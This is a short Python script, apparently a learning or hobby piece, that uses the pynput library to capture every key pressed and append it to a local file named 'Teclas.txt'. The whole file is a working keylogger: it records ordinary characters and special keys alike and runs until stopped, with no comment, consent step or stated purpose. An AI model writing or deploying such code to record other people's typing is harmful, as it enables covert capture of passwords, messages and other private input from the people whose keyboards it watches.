from pynput.keyboard import Key, Listener # type: ignore

def keypress(key):
    try:
        with open('Teclas.txt', 'a') as file:
            file.write(f'{key.char}')     
    except AttributeError:
        with open('Teclas.txt', 'a') as file:
            file.write(f'\n{key}\n')

with Listener(on_press=keypress) as keyboard_listener:
    keyboard_listener.join()
